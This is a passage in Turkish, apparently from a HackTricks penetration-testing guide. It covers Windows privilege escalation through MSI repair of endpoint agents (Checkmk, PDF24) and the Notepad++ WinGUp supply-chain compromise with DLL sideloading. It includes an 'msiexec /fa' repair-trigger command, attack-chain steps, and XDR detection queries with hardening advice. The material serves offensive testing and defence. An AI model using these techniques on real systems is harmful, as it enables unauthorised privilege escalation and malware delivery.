    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operasyonel notlar:
- `qwinsta`, `msiexec /fa` etkileşimsiz bir WinRM shell'inden başarısız olduğunda ve mevcut bir masaüstü/bağlantısı kesilmiş oturumun onarımı doğru şekilde tetikleyip tetikleyemeyeceğini anlamanız gerektiğinde kullanışlıdır.<sup>[[7]](#references)</sup>
- Bu örüntü, **geçici betikleri herkesin yazabildiği konumlara yerleştirip daha sonra SYSTEM olarak çalıştıran** diğer endpoint agent'larına ve updater'lara da uygulanabilir. Öngörülebilir adları, exclusive create semantiğinin eksikliğini ve isteğe bağlı olarak tetiklenebilen onarım/güncelleme akışlarını test edin.

### Etkileşimli installer onarımı ve ayrıcalıklı konsol

PDF24 Creator 11.15.1, ayrı bir MSI onarım riskini gösterir: yazıcı kurulumuna ait custom action, onarım sırasında SYSTEM haklarıyla görünür bir konsol başlatabilir. Üretici, bu davranışı gidermek için MSI installer'ı 11.15.2 sürümünde değiştirdi. Ürünün eski bir sürümü yalnızca bir triyaj ipucudur. Kayıtlı veya erişilebilir MSI paketini, bu kullanıcının onarımı başlatıp başlatamayacağını, güvenlik açığı bulunan custom action'ın ve log dosyası gecikmesinin mevcut olup olmadığını ve etkileşimli bir masaüstünün konsolu görünür kılıp kılamayacağını kontrol edin. Bildirilen gecikmede `faxPrnInst.log` üzerinde bir oplock kullanılıyordu; dosyanın sıradan şekilde yazılabilir olması tek erişim koşulu değildi. Etkileşimsiz bir shell, erişilemeyen bir paket veya yamalanmış bir installer zinciri bozabilir. Bu sorun `AlwaysInstallElevated` özelliğine bağlı değildir ve öngörülebilir bir geçici betiği değiştirmekten farklıdır.

---
## Zayıf updater doğrulaması üzerinden uzaktan tedarik zinciri ele geçirme (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ güncelleme akışının arkasındaki barındırma altyapısını ele geçiren saldırganlar, seçili kurbanlara kötü amaçlı manifest'leri hedefli olarak sundu. Eski WinGUp tabanlı updater'lar güncelleme özgünlüğünü tam olarak doğrulamıyordu; bu nedenle kötü amaçlı bir XML yanıtı istemcileri saldırganların kontrolündeki URL'lere yönlendirebiliyordu. İstemci, indirilen installer için hem güvenilir sertifika zincirini hem de geçerli bir PE imzasını zorunlu kılmadan HTTPS içeriğini kabul ettiğinden, kurbanlar trojan'laştırılmış bir NSIS `update.exe` dosyasını indirip çalıştırdı.<sup>[[12]](#references)[[13]](#references)</sup>

Operasyonel akış (yerel exploit gerekmez):
1. **Altyapının araya girmesi**: CDN/hosting altyapısını ele geçirip güncelleme kontrollerine, kötü amaçlı bir indirme URL'sini gösteren saldırgan metadata'sıyla yanıt verin.
2. **Trojan'laştırılmış NSIS**: Installer bir payload indirip çalıştırır ve iki yürütme zincirinden yararlanır:
   - **Kendi imzalı binary'sini getir + sideload**: imzalı Bitdefender `BluetoothService.exe` dosyasını pakete ekleyip arama yoluna kötü amaçlı bir `log.dll` bırakın. İmzalı binary çalıştığında Windows `log.dll` dosyasını sideload eder; bu DLL, Chrysalis backdoor'unu çözüp reflectively yükler (statik tespiti zorlaştırmak için Warbird koruması + API hashing kullanır).
   - **Betiklenmiş shellcode injection**: NSIS, shellcode enjekte etmek ve Cobalt Strike Beacon'ı yerleştirmek için Win32 API'lerini (ör. `EnumWindowStationsW`) kullanan derlenmiş bir Lua betiğini çalıştırır.<sup>[[12]](#references)</sup>

Herhangi bir auto-updater için güçlendirme/tespit çıkarımları:
- İndirilen installer'ın **sertifika + imza doğrulamasını** zorunlu kılın (üreticinin imzalayan sertifikasını sabitleyin, eşleşmeyen CN/zinciri reddedin) ve güncelleme manifest'ini de imzalayın (ör. XMLDSig). Manifest tarafından kontrol edilen yönlendirmeleri doğrulanmadıkları sürece engelleyin.
- **Kendi imzalı binary'sini getirerek sideload etme** yöntemini indirme sonrası tespit için bir pivot olarak ele alın: imzalı bir üretici EXE'si, DLL'yi standart kurulum yolu dışındaki bir konumdan yüklediğinde (ör. Bitdefender'ın Temp/Downloads içindeki `log.dll` dosyasını yüklemesi) ve bir updater, Temp konumuna üretici imzası taşımayan installer'lar bırakıp çalıştırdığında uyarı verin.
- Bu zincirde gözlemlenen **malware'e özgü artifact'ları** izleyin (genel pivotlar olarak kullanışlıdır): `Global\Jdhfv_1.0.1` mutex'i, `%TEMP%` konumuna yapılan olağandışı `gup.exe` yazmaları ve Lua ile yürütülen shellcode injection aşamaları.
- Notepad++, v8.8.9 ve sonraki sürümlerde WinGUp'ı güçlendirerek karşılık verdi: artık döndürülen XML imzalanıyor (XMLDSig) ve daha yeni sürümler yalnızca aktarım katmanına güvenmek yerine indirilen installer'ın sertifika + imza doğrulamasını zorunlu kılıyor.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender imzalı EXE ile <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> Notepad++ dışındaki bir yükleyiciyi başlatıyor</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Bu kalıplar, imzasız manifestleri kabul eden veya installer imzalayanlarını sabitlemeyen tüm updater’lar için geçerlidir: ağın ele geçirilmesi + kötü amaçlı installer + saldırganın kendi imzasıyla yapılan sideloading, “güvenilir” güncellemeler kisvesi altında uzaktan kod yürütülmesine yol açar.

---
## References
- [1] [Güvenlik Duyurusu – Netskope Client for Windows – Sahte Sunucu Üzerinden Yerel Yetki Yükseltme (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Güvenlik Duyurusu NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope eklentisi](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre ve Razer Synapse 4 üzerinde Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent'taki yazılabilir dosyalar üzerinden yerel yetki yükseltme](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent'ta yetki yükseltme](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC'leri](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Ulus-devlet aktörleri Notepad++ tedarik zincirinden yararlanıyor](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Ele geçirilen altyapı olayı hakkında güncelleme](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows'ta CVE-2025-0309 düzeltmesini atlatma](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage'taki yetki yükseltme açıklarının ortaya çıkarılması](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC'den SYSTEM'e](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
